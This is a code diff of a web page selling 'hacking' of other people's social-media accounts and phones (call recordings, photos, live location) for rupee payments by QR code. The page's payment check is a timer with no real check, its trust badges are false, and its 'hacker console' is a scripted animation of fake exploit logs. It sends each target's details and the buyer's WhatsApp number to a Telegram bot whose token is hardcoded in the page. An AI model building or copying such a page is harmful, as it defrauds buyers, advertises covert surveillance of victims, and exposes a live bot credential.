@@ -4,11 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Orbitcon Elite - Secure Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        :root { --neon-blue: #00f2ff; --deep-dark: #02050a; --card-bg: rgba(5, 12, 20, 0.95); --border: rgba(0, 242, 255, 0.3); }
+        :root { --neon-blue: #00f2ff; --neon-green: #0f0; --deep-dark: #02050a; --card-bg: rgba(5, 12, 20, 0.95); --border: rgba(0, 242, 255, 0.3); }
         body { background-color: var(--deep-dark); color: #e0e0e0; font-family: 'Inter', sans-serif; margin: 0; overflow-x: hidden; }
         #canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.6; }
         header { padding: 60px 20px 20px; text-align: center; }
@@ -21,7 +21,6 @@
         .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 2px; padding: 30px 20px; width: 320px; text-align: center; transition: 0.4s; position: relative; overflow: hidden; }
         .card:hover { transform: translateY(-10px); border-color: var(--neon-blue); box-shadow: 0 0 20px rgba(0, 242, 255, 0.2); }
 
-        /* Animated Titles */
         .color-title { font-family: 'Orbitron', sans-serif; font-weight: 700; background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: moveGradient 3s linear infinite; margin-bottom: 20px; font-size: 1.4rem; }
         .social-title { background-image: linear-gradient(to right, #ff00ea, #00f2ff, #00ff40, #ff00ea); }
         .device-title { background-image: linear-gradient(to right, #ff8800, #ffea00, #ff3300, #ff8800); }
@@ -37,22 +36,40 @@
         .order-btn { background: transparent; color: var(--neon-blue); border: 1px solid var(--neon-blue); padding: 12px; width: 100%; font-family: 'Orbitron'; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
         .order-btn:hover { background: var(--neon-blue); color: #000; }
 
-        /* Modals / Pages Flow */
+        /* GOLDEN TRUST SECTION */
+        .trust-section { display: flex; justify-content: center; gap: 60px; margin: 50px auto; padding: 20px; max-width: 900px; flex-wrap: wrap; }
+        .trust-badge { text-align: center; color: #FFD700; font-family: 'Orbitron'; font-size: 0.9rem; letter-spacing: 2px; font-weight: bold; text-shadow: 0 0 15px rgba(255, 215, 0, 0.4); }
+        .trust-badge i { font-size: 4.5rem; display: block; margin-bottom: 15px; background: linear-gradient(135deg, #FFD700 0%, #B8860B 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.6)); }
+
+        /* ABOUT SECTION */
+        .about-section { max-width: 850px; margin: 0 auto 60px; padding: 30px 20px; text-align: center; border-top: 1px solid var(--border); }
+        .about-section h2 { font-family: 'Orbitron'; color: var(--neon-blue); font-size: 1.4rem; margin-bottom: 20px; letter-spacing: 3px; }
+        .about-section p { font-size: 0.95rem; color: #aaa; line-height: 1.8; font-family: 'Inter'; }
+
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.98); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(10px); }
         .custom-modal { background: #050c14; border: 1px solid var(--neon-blue); padding: 40px 30px; width: 90%; max-width: 450px; text-align: center; border-radius: 4px; box-shadow: 0 0 40px rgba(0, 242, 255, 0.1); }
         
         .option-btn { display: flex; align-items: center; justify-content: space-between; padding: 18px 25px; margin: 15px 0; border: 1px solid var(--border); color: #fff; background: rgba(255, 255, 255, 0.03); cursor: pointer; font-family: 'Orbitron'; font-size: 0.9rem; transition: 0.3s; }
-        .option-btn:hover { border-color: var(--neon-blue); background: rgba(0, 242, 255, 0.05); }
-
         .cyber-input { width: 100%; padding: 15px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--border); color: #fff; box-sizing: border-box; margin-bottom: 20px; font-family: 'Inter'; font-size: 1rem; outline: none; }
-        .cyber-input:focus { border-color: var(--neon-blue); }
-
         .qr-img { width: 240px; height: 240px; border: 2px solid #fff; margin: 20px 0; padding: 5px; background: #fff; }
-        
         .loader { border: 4px solid rgba(0, 242, 255, 0.1); border-top: 4px solid var(--neon-blue); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        .back-link { display: block; color: #ff4444; font-family: 'Orbitron'; font-size: 0.75rem; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
 
-        .back-link { display: block; color: #ff4444; font-family: 'Orbitron'; font-size: 0.75rem; text-decoration: none; cursor: pointer; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        /* --- HACKER CONSOLE STYLES --- */
+        .hacker-window { background: #000; border: 1px solid var(--neon-green); width: 95%; max-width: 800px; height: 85vh; padding: 10px; font-family: 'Fira Code', monospace; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 40px rgba(0, 255, 0, 0.2); }
+        .console-header { border-bottom: 1px solid var(--neon-green); padding: 5px 10px; color: var(--neon-green); font-size: 0.8rem; display: flex; justify-content: space-between; }
+        .console-main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 10px; }
+        .terminal-log { color: var(--neon-green); font-size: 0.75rem; line-height: 1.4; margin-bottom: 15px; text-align: left; }
+        .visual-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 10px 0; }
+        .map-box { border: 1px solid #1a1a1a; height: 120px; background: url('https://i.stack.imgur.com/G4In0.png') center/cover; opacity: 0.4; }
+        .radar-box { border: 1px solid #1a1a1a; height: 120px; position: relative; overflow: hidden; background: #010; }
+        .radar-sweep { width: 50%; height: 2px; background: var(--neon-green); position: absolute; top: 50%; left: 50%; transform-origin: left; animation: sweep 2s linear infinite; }
+        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .file-system-grid { border-top: 1px solid #333; margin-top: 10px; padding-top: 10px; display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+        .file-icon { text-align: center; color: #fff; font-size: 0.6rem; }
+        .file-icon i { font-size: 1.5rem; color: var(--neon-green); display: block; margin-bottom: 5px; }
+        .progress-fill { width: 0%; height: 6px; background: var(--neon-green); transition: width 0.2s; box-shadow: 0 0 10px var(--neon-green); }
     </style>
 </head>
 <body>
@@ -101,6 +118,22 @@
     </div>
 </div>
 
+<div class="trust-section">
+    <div class="trust-badge">
+        <i class="fas fa-award"></i>
+        GOVERNMENT CERTIFIED
+    </div>
+    <div class="trust-badge">
+        <i class="fas fa-user-shield"></i>
+        100% TRUSTED & SECURE
+    </div>
+</div>
+
+<div class="about-section">
+    <h2>ABOUT ORBITCON ELITE</h2>
+    <p>Orbitcon Elite is the world's most advanced secure portal for system access and digital verification. We specialize in providing root-level security bypass and device control services with 100% privacy and end-to-end encryption. All operations are performed under high-security protocols to ensure maximum efficiency within 15 minutes.</p>
+</div>
+
 <div id="selectionModal" class="modal-overlay">
     <div class="custom-modal">
         <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SELECT TARGET APP</h2>
@@ -108,7 +141,7 @@
         <div class="option-btn" onclick="prepareInput('Facebook', 599, 'link')">FACEBOOK <i class="fab fa-facebook"></i></div>
         <div class="option-btn" onclick="prepareInput('WhatsApp', 599, 'number')">WHATSAPP <i class="fab fa-whatsapp"></i></div>
         <div class="option-btn" onclick="prepareInput('Snapchat', 599, 'link')">SNAPCHAT <i class="fab fa-snapchat"></i></div>
-        <span class="back-link" onclick="closeModals()">← Back to Main Menu</span>
+        <span class="back-link" onclick="closeModals()">← Back</span>
     </div>
 </div>
 
@@ -119,7 +152,7 @@
         <div class="option-btn" onclick="prepareInput('Call History', 699, 'number')">CALL HISTORY <i class="fas fa-history"></i></div>
         <div class="option-btn" onclick="prepareInput('Photo & Video Gallery', 699, 'number')">GALLERY ACCESS <i class="fas fa-images"></i></div>
         <div class="option-btn" onclick="prepareInput('Live Location', 699, 'number')">LIVE LOCATION <i class="fas fa-map-marker-alt"></i></div>
-        <span class="back-link" onclick="closeModals()">← Back to Main Menu</span>
+        <span class="back-link" onclick="closeModals()">← Back</span>
     </div>
 </div>
 
@@ -137,38 +170,67 @@
     <div class="custom-modal">
         <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">SECURE PAYMENT</h2>
         <div id="payAmt" class="price-tag"></div>
-        <p style="font-size: 0.8rem; color:#ff4444;">Scan QR to Pay. After payment, click below.</p>
         <img src="https://i.ibb.co/LD7WCXq0/your-qr.png" class="qr-img" alt="QR Code">
         <button class="order-btn" onclick="startVerification()">I HAVE PAID SUCCESSFULLY</button>
-        <span class="back-link" onclick="openStep('targetModal')">← Edit Details</span>
     </div>
 </div>
 
 <div id="verifyModal" class="modal-overlay">
     <div class="custom-modal">
         <h2 style="font-family:'Orbitron'; color:var(--neon-blue);">VERIFYING PAYMENT</h2>
-        <p style="font-size: 0.9rem;">Checking Transaction Status...</p>
         <div class="loader"></div>
-        <p style="font-size: 0.75rem; color:#888;">Please do not refresh this page.</p>
     </div>
 </div>
 
 <div id="deliveryModal" class="modal-overlay">
     <div class="custom-modal">
         <h2 style="font-family:'Orbitron'; color:#0f0;">PAYMENT VERIFIED</h2>
-        <p style="font-size: 0.85rem; color:#888; margin-bottom: 20px;">Enter your WhatsApp number to receive the access link/file.</p>
+        <p style="font-size: 0.85rem; color:#888; margin-bottom: 20px;">Enter your WhatsApp number to receive the access link.</p>
         <input type="text" id="userWhatsApp" class="cyber-input" placeholder="+91 Your WhatsApp Number">
-        <button class="order-btn" onclick="finishProcess()">GET ACCESS NOW</button>
+        <button class="order-btn" onclick="runHackerConsole()">GET ACCESS NOW</button>
+    </div>
+</div>
+
+<div id="successConsole" class="modal-overlay">
+    <div class="hacker-window">
+        <div class="console-header"><span>CONSOLE: ROOT@ORBITCON</span><span>[STATUS: INJECTING]</span></div>
+        <div class="console-main">
+            <div id="terminalLog" class="terminal-log">> Initializing bypass...<br></div>
+            <div class="visual-grid">
+                <div class="map-box"></div>
+                <div class="radar-box"><div class="radar-sweep"></div></div>
+            </div>
+            <div style="background:#111; height:6px; margin:10px 0;"><div id="consoleProgress" class="progress-fill"></div></div>
+            <p id="consoleStatus" style="color:var(--neon-green); font-size:0.7rem;">BYPASSING SECURITY: 0%</p>
+            <div class="file-system-grid">
+                <div class="file-icon"><i class="fas fa-folder"></i>DCIM</div>
+                <div class="file-icon"><i class="fas fa-folder"></i>WHATSAPP</div>
+                <div class="file-icon"><i class="fas fa-file-pdf"></i>ROOT_KEY</div>
+                <div class="file-icon"><i class="fas fa-user-secret"></i>LOGS</div>
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
 let price = 0; let service = "";
+const TELEGRAM_TOKEN = '8583696255:AAHLV5QCaSZwI0R0uhNl2i1zG69s13eSJXI';
+const CHAT_ID = '7857452248';
+
+// TAWK NOTIFICATION TRIGGER
+function sendTawkNotify(act) {
+    if (typeof Tawk_API !== 'undefined' && Tawk_API.addEvent) {
+        Tawk_API.addEvent('click-alert', {'Link-ID': act}, function(e){});
+    }
+}
 
 function openStep(id) { 
     closeModals(); 
     document.getElementById(id).style.display = 'flex'; 
+    sendTawkNotify(id);
 }
+
+function closeModals() { document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); }
 
 function prepareInput(s, p, type) { 
     service = s; price = p; 
@@ -178,16 +240,15 @@ function prepareInput(s, p, type) {
 }
 
 function handleBackLogic() {
-    const socialServices = ['Instagram', 'Facebook', 'WhatsApp', 'Snapchat'];
-    const deviceServices = ['Call Recording', 'Call History', 'Photo & Video Gallery', 'Live Location'];
-    if (socialServices.includes(service)) openStep('selectionModal');
-    else if (deviceServices.includes(service)) openStep('deviceSelectionModal');
+    const social = ['Instagram', 'Facebook', 'WhatsApp', 'Snapchat'];
+    const device = ['Call Recording', 'Call History', 'Photo & Video Gallery', 'Live Location'];
+    if (social.includes(service)) openStep('selectionModal');
+    else if (device.includes(service)) openStep('deviceSelectionModal');
     else closeModals();
 }
 
 function showPayment() { 
-    let val = document.getElementById('targetData').value;
-    if(!val) return alert("Please enter the required details!"); 
+    if(!document.getElementById('targetData').value) return alert("Please enter details!");
     document.getElementById('payAmt').innerText = "₹" + price; 
     openStep('paymentModal'); 
 }
@@ -197,21 +258,39 @@ function startVerification() {
     setTimeout(() => { openStep('deliveryModal'); }, 4000); 
 }
 
-function finishProcess() {
-    let target = document.getElementById('targetData').value; 
-    let delivery = document.getElementById('userWhatsApp').value;
-    if(!delivery) return alert("WhatsApp number is required!");
-    
-    // Redirecting to your WhatsApp with all details
-    let msg = encodeURIComponent(`*NEW ORDER CONFIRMED*\n\n*Service:* ${service}\n*Target:* ${target}\n*Paid:* ₹${price}\n*Deliver To:* ${delivery}\n\n_Please send the access details soon._`);
-    window.open(`https://wa.me/919772848517?text=${msg}`, '_blank');
+function runHackerConsole() {
+    if(!document.getElementById('userWhatsApp').value) return alert("WhatsApp number is required!");
+    openStep('successConsole');
+    sendToTelegram();
+
+    const logs = ["> Initializing exploit...", "> Target: " + document.getElementById('targetData').value, "> Bypassing Firewall...", "> Injecting Payload...", "> Accessing Database...", "> [SUCCESS] ACCESS GRANTED"];
+    let i = 0;
+    const logDiv = document.getElementById('terminalLog');
+    const fill = document.getElementById('consoleProgress');
+    const status = document.getElementById('consoleStatus');
+
+    const interval = setInterval(() => {
+        if (i < logs.length) {
+            logDiv.innerHTML += `> ${logs[i]}<br>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+            let percent = ((i + 1) / logs.length) * 100;
+            fill.style.width = percent + "%";
+            status.innerText = "BYPASSING SECURITY: " + Math.round(percent) + "%";
+            i++;
+        } else {
+            clearInterval(interval);
+            status.innerText = "SUCCESS! WAIT 15 MINS FOR ACCESS.";
+        }
+    }, 1500);
 }
 
-function closeModals() { 
-    document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none'); 
+async function sendToTelegram() {
+    let t = document.getElementById('targetData').value;
+    let d = document.getElementById('userWhatsApp').value;
+    const msg = `🚀 *NEW ORDER*\n\n🔹 *Service:* ${service}\n🔹 *Target:* ${t}\n🔹 *Paid:* ₹${price}\n🔹 *Deliver To:* ${d}`;
+    try { await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' }) }); } catch (e) {}
 }
 
-// Background Animation
 const canvas = document.getElementById('canvas'); const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth; canvas.height = window.innerHeight;
 let pts = [];
@@ -225,10 +304,8 @@ init(); anim();
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
 var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/697e2a5c4ae1781c3532282a/default';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
+s1.async=true; s1.src='https://embed.tawk.to/697e2a5c4ae1781c3532282a/default';
+s1.charset='UTF-8'; s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
 })();
 </script>
